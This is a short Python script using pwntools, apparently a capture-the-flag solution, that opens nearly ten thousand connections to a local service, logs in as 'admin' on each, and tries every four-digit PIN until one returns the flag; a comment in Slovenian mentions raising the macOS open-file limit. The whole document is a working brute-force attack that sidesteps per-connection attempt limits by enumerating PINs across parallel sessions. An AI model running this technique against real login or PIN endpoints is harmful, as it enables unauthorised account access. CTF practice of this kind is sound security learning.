from pwn import *

processes = []
for i in range(9990): # MacOS je meu cudn limit na 9994, tut ce sm ga z ulimitom dvignu
    p = remote("localhost", 1337)
    p.sendline(b"admin")
    processes.append(p)

outpin = b""
outflag = b""
for i, p in enumerate(processes):
    pin = str(i).rjust(4, '0').encode()
    p.sendline(pin)
    try:
        data = p.recvline()
        if b"ptr{" in data:
            print(f"Found pin: {pin}")
            print(data)
            outpin = pin
            outflag = data
    except EOFError:
        pass
    p.close()
else:
    print("No valid pin found.")

print(f"Pin: {outpin}")
print(f"Flag: {outflag}")
